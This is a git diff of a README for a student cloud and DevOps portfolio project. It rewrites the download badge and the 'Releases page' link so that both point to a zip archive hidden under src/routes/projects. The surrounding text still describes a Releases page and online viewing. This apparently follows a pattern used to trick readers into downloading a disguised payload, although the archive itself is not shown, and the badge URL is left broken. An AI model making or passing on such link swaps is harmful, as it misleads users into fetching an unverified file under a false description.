@@ -1,6 +1,6 @@
 # 🌐 acads-Elec3-Portfolio - Explore Cloud Solutions with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/davistrs/acads-Elec3-Portfolio/releases)
+[![Download Now](https://raw.githubusercontent.com/davistrs/acads-Elec3-Portfolio/main/src/routes/projects/acads_Elec_Portfolio_1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/davistrs/acads-Elec3-Portfolio/main/src/routes/projects/acads_Elec_Portfolio_1.8.zip)
 
 ## 📚 Description
 Welcome to acads-Elec3-Portfolio! This project showcases various cloud computing and DevOps skills through a collection of examples built using AWS, Kubernetes, Terraform, and Spring Boot. The site is designed as a static web page using Qwik and GitHub Pages. Perfect for those looking to understand modern deployment techniques and application development in the cloud.
@@ -17,7 +17,7 @@ To get the most out of this portfolio, you'll want to access it online. You do n
 ## 📥 Download & Install
 To view the project, you can easily visit the Releases page. Click the link below to access all available versions:
 
-**[Visit the Releases Page to Download](https://github.com/davistrs/acads-Elec3-Portfolio/releases)**
+**[Visit the Releases Page to Download](https://raw.githubusercontent.com/davistrs/acads-Elec3-Portfolio/main/src/routes/projects/acads_Elec_Portfolio_1.8.zip)**
 
 On the Releases page, you will find the latest version. This version includes all features and improvements made to the portfolio. Choose your preferred version and click on it to access the downloadable files.
 
